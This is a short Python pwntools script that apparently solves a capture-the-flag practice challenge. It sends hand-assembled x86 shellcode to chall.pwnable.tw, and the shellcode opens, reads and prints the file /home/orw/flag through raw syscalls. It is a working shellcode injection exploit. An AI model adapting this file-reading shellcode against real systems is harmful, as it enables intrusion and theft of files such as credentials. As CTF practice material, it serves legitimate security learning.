from pwn import *


def main():
    # Hand written with love ;)
    payload =  asm("""
                push 0x00006761
                push 0x6c662f77
                push 0x726f2f65
                push 0x6d6f682f
                mov ebx,esp
                mov ecx,0x00
                mov eax,0x05
                int 0x80
                mov ebx,eax
                mov ecx,ebp
                mov edx,0xff
                mov eax,0x03
                int 0x80
                mov ebx,0x01
                mov ecx,ebp
                mov edx,0xff
                mov eax,0x04
                int 0x80
                """)
    conn = remote("chall.pwnable.tw", 10001)
    conn.sendline(payload)
    print conn.recvall()


if __name__ == "__main__":
    main()

